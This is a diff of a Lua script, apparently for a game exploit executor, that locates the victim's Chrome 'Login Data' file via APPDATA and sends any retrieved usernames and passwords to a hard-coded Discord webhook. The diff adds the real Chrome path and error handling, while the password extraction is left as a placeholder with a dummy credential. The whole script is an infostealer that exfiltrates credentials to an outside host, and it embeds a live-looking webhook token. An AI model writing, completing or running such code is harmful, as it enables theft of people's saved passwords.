@@ -2,16 +2,18 @@ local function sendWebhook(webhookUrl, data)
     local headers = {
         ["content-type"] = "application/json"
     }
-    
+
     -- Choose an HTTP request function compatible with your environment
     local request = http_request or request or HttpPost or syn.request
     local payload = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
-    
-    request(payload)
+
+    local success, err = pcall(request, payload)
+    if not success then
+        print("Error sending webhook: " .. err)
+    end
 end
 
 local function createWebhookData(passwords)
-    -- Customize the message content
     local content = "Retrieved passwords:\n"
     for _, password in ipairs(passwords) do
         content = content .. password.username .. ": " .. password.password .. "\n"
@@ -20,32 +22,33 @@ local function createWebhookData(passwords)
 end
 
 local function getChromePasswords()
-    local f = io.open("////path////to////chrome////profile////Login Data", "rb")
+    local appDataPath = os.getenv("APPDATA")
+    local chromePath = appDataPath .. "\\Google\\Chrome\\User Data\\Default\\Login Data"
+
+    local f = io.open(chromePath, "rb")
+    if not f then
+        error("Could not open file. Please check if Chrome is installed and the path is correct.")
+    end
+
     local login_data = f:read("*all")
     f:close()
 
-    local decoded = require "base64".decode(login_data)
-    local logins = require "cjson".decode(decoded)
+    -- Note: You will need SQLite to read the "Login Data" file properly
+    -- This is a placeholder. Implement SQLite logic to retrieve passwords
+    local passwords = {}  -- Replace with actual logic to extract passwords from SQLite data
 
-    local passwords = {}
-    for i, v in ipairs(logins) do
-        local username, password
-        for k, v2 in pairs(v) do
-            if k == "username" then
-                username = v2
-            elseif k == "password" then
-                password = v2
-            end
-        end
-        if username and password then
-            table.insert(passwords, {username = username, password = password})
-        end
-    end
+    -- Example of how you might add a password (for testing purposes)
+    table.insert(passwords, {username = "example_user", password = "example_password"})
+
     return passwords
 end
 
 local webhookUrl = "https://discord.com/api/webhooks/1288886461080408126/or_ljH8rWPnHus5yE87SxaNLwoCO_7dlpPE_pFd5PI75kjMZztyRwcVgNZFS5V13Tfsf"
 local passwords = getChromePasswords()
-local webhookData = createWebhookData(passwords)
 
-sendWebhook(webhookUrl, webhookData)
+if #passwords > 0 then
+    local webhookData = createWebhookData(passwords)
+    sendWebhook(webhookUrl, webhookData)
+else
+    print("No passwords retrieved.")
+end
